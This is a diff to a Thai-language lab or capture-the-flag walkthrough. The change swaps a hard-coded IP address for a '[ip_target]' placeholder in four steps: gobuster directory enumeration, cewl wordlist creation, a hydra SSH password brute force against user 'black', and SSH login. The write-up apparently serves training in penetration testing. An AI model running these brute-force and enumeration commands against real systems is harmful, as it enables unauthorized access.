@@ -8,7 +8,7 @@
 
 ขั้นตอนที่ 2 : ใช้ gobuster เพื่อค้นหาเส้นทางหรือไดเร็กทอรีที่ซ่อนอยู่
 
-Command : gobuster dir -u http://172.31.73.26// -w /usr/share/wordlists/dirb/common.txt 
+Command : gobuster dir -u http://[ip_target]// -w /usr/share/wordlists/dirb/common.txt 
 
 คำอธิบายเพิ่มเติม
 
@@ -28,7 +28,7 @@ Command : gobuster dir -u http://172.31.73.26// -w /usr/share/wordlists/dirb/com
 
 ขั้นตอนที่ 3 : ใช้ cewl เพื่อสร้างรายการคำศัพท์ของรหัสผ่าน จากนั้นจึงคัดลอกไปสร้างเป็นไฟล์ .txt
 
-Command : cewl http://172.31.73.26/
+Command : cewl http://[ip_target]/
 
 <img width="1206" height="684" alt="image" src="https://github.com/user-attachments/assets/a29f35d6-97a7-4b8c-998f-9529626aaec1" />
 
@@ -45,7 +45,7 @@ Command : cewl http://172.31.73.26/
 
 ขั้นตอนที่ 4 : ใช้ไฮดราเพื่อค้นหารหัสผ่านสำหรับผู้ใช้คำสั่ง black ต่อไปนี้
 
-Command : hydra –l black –P /usr/bin/memory.txt 172.31.73.26 ssh 
+Command : hydra –l black –P /usr/bin/memory.txt [ip_target] ssh 
 
 คำอธิบายเพิ่มเติม
 
@@ -59,7 +59,7 @@ Command : hydra –l black –P /usr/bin/memory.txt 172.31.73.26 ssh
 
 ขั้นตอนที่ 5 : หลังจากที่ได้ password ของเครื่องเป้าหมาย เราจะ ssh เพื่อเข้าถึงเครื่องเป้าหมาย 
 
-Command : ssh black@172.31.73.26
+Command : ssh black@[ip_target]
 
 <img width="516" height="64" alt="image" src="https://github.com/user-attachments/assets/c870ab64-b8b6-427b-a4ee-a753f7a4b666" />
 
